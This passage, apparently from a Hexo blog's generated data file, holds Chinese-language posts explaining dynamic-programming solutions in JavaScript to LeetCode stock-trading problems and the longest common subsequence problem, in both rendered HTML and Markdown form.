class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!prices.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> buy = [];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> sell = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      buy[i] = -prices[<span class=\"number\">0</span>];</span><br><span class=\"line\">      sell[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (i === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      buy[i] = <span class=\"built_in\">Math</span>.max(-prices[<span class=\"number\">1</span>], buy[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">      sell[i] = <span class=\"built_in\">Math</span>.max(prices[<span class=\"number\">1</span>] - prices[<span class=\"number\">0</span>], sell[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      buy[i] = <span class=\"built_in\">Math</span>.max(sell[i - <span class=\"number\">2</span>] - prices[i], buy[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">      sell[i] = <span class=\"built_in\">Math</span>.max(buy[i - <span class=\"number\">1</span>] + prices[i], sell[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sell[prices.length - <span class=\"number\">1</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-动态规划-求买卖股票求最大利润\"><a href=\"#技巧篇-动态规划-求买卖股票求最大利润\" class=\"headerlink\" title=\"技巧篇 - 动态规划 - 求买卖股票求最大利润\"></a>技巧篇 - 动态规划 - 求买卖股票求最大利润</h1><h3 id=\"买卖股票的最佳时机（leetcode-题目编号-121）\"><a href=\"#买卖股票的最佳时机（leetcode-题目编号-121）\" class=\"headerlink\" title=\"买卖股票的最佳时机（leetcode 题目编号 121）\"></a>买卖股票的最佳时机（leetcode 题目编号 121）</h3><p><strong>问题：</strong><br>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p>\n<p>如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。</p>\n<p>注意：你不能在买入股票前卖出股票。</p>\n<p><strong>示例：</strong><br>示例 1:<br>输入: [7,1,5,3,6,4]<br>输出: 5<br>解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。<br>     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</p>\n<p>示例 2:<br>输入: [7,6,4,3,1]<br>输出: 0<br>解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>遍历数组取里面的最小值作为买入价</li>\n<li>每次比较遍历项与买入价的差值</li>\n<li>取各差值的最大者即为最大利润</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> buy = prices[<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (prices[i] &gt; buy) &#123;</span><br><span class=\"line\">      res = <span class=\"built_in\">Math</span>.max(res, prices[i] - buy);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      buy = prices[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"买卖股票的最佳时机-II（leetcode-题目编号-122）\"><a href=\"#买卖股票的最佳时机-II（leetcode-题目编号-122）\" class=\"headerlink\" title=\"买卖股票的最佳时机 II（leetcode 题目编号 122）\"></a>买卖股票的最佳时机 II（leetcode 题目编号 122）</h3><p><strong>问题：</strong><br>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p>\n<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>\n<p>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>\n<p><strong>示例：</strong><br>示例 1:<br>输入: [7,1,5,3,6,4]<br>输出: 7<br>解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。<br>     随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。</p>\n<p>示例 2:<br>输入: [1,2,3,4,5]<br>输出: 4<br>解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。<br>     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。<br>     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>从第二天开始，如果当前价格比之前价格高，则把差值加入利润中</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; prices.length - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (prices[i] &lt; prices[i + <span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">      res += prices[i + <span class=\"number\">1</span>] - prices[i]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"买卖股票的最佳时机-III（leetcode-题目编号-123）\"><a href=\"#买卖股票的最佳时机-III（leetcode-题目编号-123）\" class=\"headerlink\" title=\"买卖股票的最佳时机 III（leetcode 题目编号 123）\"></a>买卖股票的最佳时机 III（leetcode 题目编号 123）</h3><p><strong>问题：</strong><br>给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。</p>\n<p>设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。</p>\n<p>注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>\n<p><strong>示例：</strong><br>示例 1:<br>输入: [3,3,5,0,0,3,1,4]<br>输出: 6<br>解释: 在第 4 天（股票价格 = 0）的时候买入，在第 6 天（股票价格 = 3）的时候卖出，这笔交易所能获得利润 = 3-0 = 3 。<br>     随后，在第 7 天（股票价格 = 1）的时候买入，在第 8 天 （股票价格 = 4）的时候卖出，这笔交易所能获得利润 = 4-1 = 3 。</p>\n<p>示例 2:<br>输入: [1,2,3,4,5]<br>输出: 4<br>解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。  <br>     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。  <br>     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>定义 <code>local[i][j]</code> 为在到达第 <code>i</code> 天时最多可进行 <code>j</code> 次交易并且<strong>最后一次交易在最后一天卖出</strong>的最大利润，此为局部最优</li>\n<li>定义 <code>global[i][j]</code> 为在到达第 <code>i</code> 天时最多可进行 <code>j</code> 次交易的最大利润，此为全局最优</li>\n<li>局部最优值是比较<strong>前一天并少交易一次的全局最优加上大于0的差值</strong>，和<strong>前一天的局部最优加上差值</strong>中取较大值</li>\n<li>全局最优是比较<strong>局部最优</strong>和<strong>前一天的全局最优</strong></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!prices.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> local = [[<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>]];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> <span class=\"built_in\">global</span> = [[<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>]];</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> diff = prices[i] - prices[i - <span class=\"number\">1</span>];</span><br><span class=\"line\">    local[i] = [<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"built_in\">global</span>[i] = [<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">1</span>; j &lt;= <span class=\"number\">2</span>; j++) &#123;</span><br><span class=\"line\">      local[i][j] = <span class=\"built_in\">Math</span>.max(<span class=\"built_in\">global</span>[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"built_in\">Math</span>.max(diff, <span class=\"number\">0</span>), local[i - <span class=\"number\">1</span>][j] + diff);      </span><br><span class=\"line\">      <span class=\"built_in\">global</span>[i][j] = <span class=\"built_in\">Math</span>.max(local[i][j], <span class=\"built_in\">global</span>[i - <span class=\"number\">1</span>][j]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">global</span>[prices.length - <span class=\"number\">1</span>][<span class=\"number\">2</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"最佳买卖股票时机含冷冻期（leetcode-题目编号-309）\"><a href=\"#最佳买卖股票时机含冷冻期（leetcode-题目编号-309）\" class=\"headerlink\" title=\"最佳买卖股票时机含冷冻期（leetcode 题目编号 309）\"></a>最佳买卖股票时机含冷冻期（leetcode 题目编号 309）</h3><p><strong>问题：</strong><br>给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。​</p>\n<p>设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）:</p>\n<p>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。<br>卖出股票后，你无法在第二天买入股票 (即冷冻期为 1 天)。</p>\n<p><strong>示例：</strong><br>示例1:</p>\n<p>输入: [1,2,3,0,2]<br>输出: 3<br>解释: 对应的交易状态为: [买入, 卖出, 冷冻期, 买入, 卖出]</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>设 <code>buy[i]</code> 表示在第 <code>i</code> 天之前最后一个操作是买，此时的最大收益。</li>\n<li>设 <code>sell[i]</code> 表示在第 <code>i</code> 天之前最后一个操作是卖，此时的最大收益。</li>\n<li>则可以得出递推公式 <code>buy[i]  = max(sell[i-2] - price, buy[i-1])</code> 、<code>sell[i] = max(buy[i-1] + price, sell[i-1])</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!prices.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> buy = [];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> sell = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      buy[i] = -prices[<span class=\"number\">0</span>];</span><br><span class=\"line\">      sell[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (i === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      buy[i] = <span class=\"built_in\">Math</span>.max(-prices[<span class=\"number\">1</span>], buy[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">      sell[i] = <span class=\"built_in\">Math</span>.max(prices[<span class=\"number\">1</span>] - prices[<span class=\"number\">0</span>], sell[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      buy[i] = <span class=\"built_in\">Math</span>.max(sell[i - <span class=\"number\">2</span>] - prices[i], buy[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">      sell[i] = <span class=\"built_in\">Math</span>.max(buy[i - <span class=\"number\">1</span>] + prices[i], sell[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sell[prices.length - <span class=\"number\">1</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"技巧篇 - 动态规划","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 动态规划\n\n### 最长公共子序列（leetcode 题目编号 1143）\n**问题：**\n给定两个字符串 text1 和 text2，返回这两个字符串的最长公共子序列的长度。\n\n一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。\n例如，\"ace\" 是 \"abcde\" 的子序列，但 \"aec\" 不是 \"abcde\" 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。\n\n若这两个字符串没有公共子序列，则返回 0。\n\n**示例：**\n示例 1:\n\n输入：text1 = \"abcde\", text2 = \"ace\" \n输出：3  \n解释：最长公共子序列是 \"ace\"，它的长度为 3。\n示例 2:\n\n输入：text1 = \"abc\", text2 = \"abc\"\n输出：3\n解释：最长公共子序列是 \"abc\"，它的长度为 3。\n示例 3:\n\n输入：text1 = \"abc\", text2 = \"def\"\n输出：0\n解释：两个字符串没有公共子序列，返回 0。\n\n**思路：**\n1. 指针 `i`、`j` 分别是指向 `str1`、`str2`，`arr[i][j]` 表示指向 `i-1`、`j-1` 时最长公共子序列的值\n2. 当 `i`、`j` 等于 `0` 时，表示其中一个字符串为空字符串，则 `arr[i][i]` 为 `0`\n3. 当 `arr[i] !== arr[j]` 时，说明指针移动时**新添加的 1 个字符**没有匹配上，则 `arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])`\n4. 当 `arr[i] === arr[j]` 时，说明指针移动时**新添加的 1 个字符**正好匹配上，则 `arr[i][j] = arr[i - 1][j - 1] + 1`\n\n**说明：**\n> 对于每次 **新添加的 1 个字符**，如果没有匹配上，相当于是即使其中个字符串没有最后一个字符，最长公共子序列的值也是一样的，所以此时 `arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])`\n> 如果 **新添加的 1 个字符** 刚好满足 `arr[i] === arr[j]`，当字符串1、字符串2同时去掉这个字符时最长公共子序列的值为 `arr[i - 1][j - 1]`，所以当同时加上这个字符时，`arr[i][j] = arr[i - 1][j - 1] + 1`\n\n```js\nvar longestCommonSubsequence = function(text1, text2) {\n  const len1 = text1.length;\n  const len2 = text2.length;\n  const arr = [];\n\n  for (let i = 0; i <= len1; i++) {\n    arr[i] = new Array();\n\n    for (let j = 0; j <= len2; j++) {\n      if (i ===0 || j === 0) {\n        arr[i][j] = 0;\n      } else if (text1[i - 1] === text2[j - 1]) {\n        arr[i][j] = arr[i - 1][j - 1] + 1;\n      } else {\n        arr[i][j] = Math.max(arr[i][j - 1], arr[i - 1][j]);\n      }\n    }\n  }\n\n  return arr[len1][len2];\n};\n```","source":"_posts/算法题/技巧篇 - 动态规划.md","raw":"---\ntitle: 技巧篇 - 动态规划\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 动态规划\n\n### 最长公共子序列（leetcode 题目编号 1143）\n**问题：**\n给定两个字符串 text1 和 text2，返回这两个字符串的最长公共子序列的长度。\n\n一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。\n例如，\"ace\" 是 \"abcde\" 的子序列，但 \"aec\" 不是 \"abcde\" 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。\n\n若这两个字符串没有公共子序列，则返回 0。\n\n**示例：**\n示例 1:\n\n输入：text1 = \"abcde\", text2 = \"ace\" \n输出：3  \n解释：最长公共子序列是 \"ace\"，它的长度为 3。\n示例 2:\n\n输入：text1 = \"abc\", text2 = \"abc\"\n输出：3\n解释：最长公共子序列是 \"abc\"，它的长度为 3。\n示例 3:\n\n输入：text1 = \"abc\", text2 = \"def\"\n输出：0\n解释：两个字符串没有公共子序列，返回 0。\n\n**思路：**\n1. 指针 `i`、`j` 分别是指向 `str1`、`str2`，`arr[i][j]` 表示指向 `i-1`、`j-1` 时最长公共子序列的值\n2. 当 `i`、`j` 等于 `0` 时，表示其中一个字符串为空字符串，则 `arr[i][i]` 为 `0`\n3. 当 `arr[i] !== arr[j]` 时，说明指针移动时**新添加的 1 个字符**没有匹配上，则 `arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])`\n4. 当 `arr[i] === arr[j]` 时，说明指针移动时**新添加的 1 个字符**正好匹配上，则 `arr[i][j] = arr[i - 1][j - 1] + 1`\n\n**说明：**\n> 对于每次 **新添加的 1 个字符**，如果没有匹配上，相当于是即使其中个字符串没有最后一个字符，最长公共子序列的值也是一样的，所以此时 `arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])`\n> 如果 **新添加的 1 个字符** 刚好满足 `arr[i] === arr[j]`，当字符串1、字符串2同时去掉这个字符时最长公共子序列的值为 `arr[i - 1][j - 1]`，所以当同时加上这个字符时，`arr[i][j] = arr[i - 1][j - 1] + 1`\n\n```js\nvar longestCommonSubsequence = function(text1, text2) {\n  const len1 = text1.length;\n  const len2 = text2.length;\n  const arr = [];\n\n  for (let i = 0; i <= len1; i++) {\n    arr[i] = new Array();\n\n    for (let j = 0; j <= len2; j++) {\n      if (i ===0 || j === 0) {\n        arr[i][j] = 0;\n      } else if (text1[i - 1] === text2[j - 1]) {\n        arr[i][j] = arr[i - 1][j - 1] + 1;\n      } else {\n        arr[i][j] = Math.max(arr[i][j - 1], arr[i - 1][j]);\n      }\n    }\n  }\n\n  return arr[len1][len2];\n};\n```","slug":"算法题/技巧篇 - 动态规划","published":1,"updated":"2021-06-07T10:02:58.585Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yi0009ok6ras7a6re1","content":"<h1 id=\"技巧篇-动态规划\"><a href=\"#技巧篇-动态规划\" class=\"headerlink\" title=\"技巧篇 - 动态规划\"></a>技巧篇 - 动态规划</h1><h3 id=\"最长公共子序列（leetcode-题目编号-1143）\"><a href=\"#最长公共子序列（leetcode-题目编号-1143）\" class=\"headerlink\" title=\"最长公共子序列（leetcode 题目编号 1143）\"></a>最长公共子序列（leetcode 题目编号 1143）</h3><p><strong>问题：</strong><br>给定两个字符串 text1 和 text2，返回这两个字符串的最长公共子序列的长度。</p>\n<p>一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。<br>例如，”ace” 是 “abcde” 的子序列，但 “aec” 不是 “abcde” 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。</p>\n<p>若这两个字符串没有公共子序列，则返回 0。</p>\n<p><strong>示例：</strong><br>示例 1:</p>\n<p>输入：text1 = “abcde”, text2 = “ace”<br>输出：3<br>解释：最长公共子序列是 “ace”，它的长度为 3。<br>示例 2:</p>\n<p>输入：text1 = “abc”, text2 = “abc”<br>输出：3<br>解释：最长公共子序列是 “abc”，它的长度为 3。<br>示例 3:</p>\n<p>输入：text1 = “abc”, text2 = “def”<br>输出：0<br>解释：两个字符串没有公共子序列，返回 0。</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>指针 <code>i</code>、<code>j</code> 分别是指向 <code>str1</code>、<code>str2</code>，<code>arr[i][j]</code> 表示指向 <code>i-1</code>、<code>j-1</code> 时最长公共子序列的值</li>\n<li>当 <code>i</code>、<code>j</code> 等于 <code>0</code> 时，表示其中一个字符串为空字符串，则 <code>arr[i][i]</code> 为 <code>0</code></li>\n<li>当 <code>arr[i] !== arr[j]</code> 时，说明指针移动时<strong>新添加的 1 个字符</strong>没有匹配上，则 <code>arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])</code></li>\n<li>当 <code>arr[i] === arr[j]</code> 时，说明指针移动时<strong>新添加的 1 个字符</strong>正好匹配上，则 <code>arr[i][j] = arr[i - 1][j - 1] + 1</code></li>\n</ol>\n<p><strong>说明：</strong></p>\n<blockquote>\n<p>对于每次 <strong>新添加的 1 个字符</strong>，如果没有匹配上，相当于是即使其中个字符串没有最后一个字符，最长公共子序列的值也是一样的，所以此时 <code>arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])</code><br>如果 <strong>新添加的 1 个字符</strong> 刚好满足 <code>arr[i] === arr[j]</code>，当字符串1、字符串2同时去掉这个字符时最长公共子序列的值为 <code>arr[i - 1][j - 1]</code>，所以当同时加上这个字符时，<code>arr[i][j] = arr[i - 1][j - 1] + 1</code></p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> longestCommonSubsequence = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">text1, text2</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> len1 = text1.length;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> len2 = text2.length;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> arr = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt;= len1; i++) &#123;</span><br><span class=\"line\">    arr[i] = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt;= len2; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (i ===<span class=\"number\">0</span> || j === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        arr[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (text1[i - <span class=\"number\">1</span>] === text2[j - <span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">        arr[i][j] = arr[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        arr[i][j] = <span class=\"built_in\">Math</span>.max(arr[i][j - <span class=\"number\">1</span>], arr[i - <span class=\"number\">1</span>][j]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr[len1][len2];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-动态规划\"><a href=\"#技巧篇-动态规划\" class=\"headerlink\" title=\"技巧篇 - 动态规划\"></a>技巧篇 - 动态规划</h1><h3 id=\"最长公共子序列（leetcode-题目编号-1143）\"><a href=\"#最长公共子序列（leetcode-题目编号-1143）\" class=\"headerlink\" title=\"最长公共子序列（leetcode 题目编号 1143）\"></a>最长公共子序列（leetcode 题目编号 1143）</h3><p><strong>问题：</strong><br>给定两个字符串 text1 和 text2，返回这两个字符串的最长公共子序列的长度。</p>\n<p>一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。<br>例如，”ace” 是 “abcde” 的子序列，但 “aec” 不是 “abcde” 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。</p>\n<p>若这两个字符串没有公共子序列，则返回 0。</p>\n<p><strong>示例：</strong><br>示例 1:</p>\n<p>输入：text1 = “abcde”, text2 = “ace”<br>输出：3<br>解释：最长公共子序列是 “ace”，它的长度为 3。<br>示例 2:</p>\n<p>输入：text1 = “abc”, text2 = “abc”<br>输出：3<br>解释：最长公共子序列是 “abc”，它的长度为 3。<br>示例 3:</p>\n<p>输入：text1 = “abc”, text2 = “def”<br>输出：0<br>解释：两个字符串没有公共子序列，返回 0。</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>指针 <code>i</code>、<code>j</code> 分别是指向 <code>str1</code>、<code>str2</code>，<code>arr[i][j]</code> 表示指向 <code>i-1</code>、<code>j-1</code> 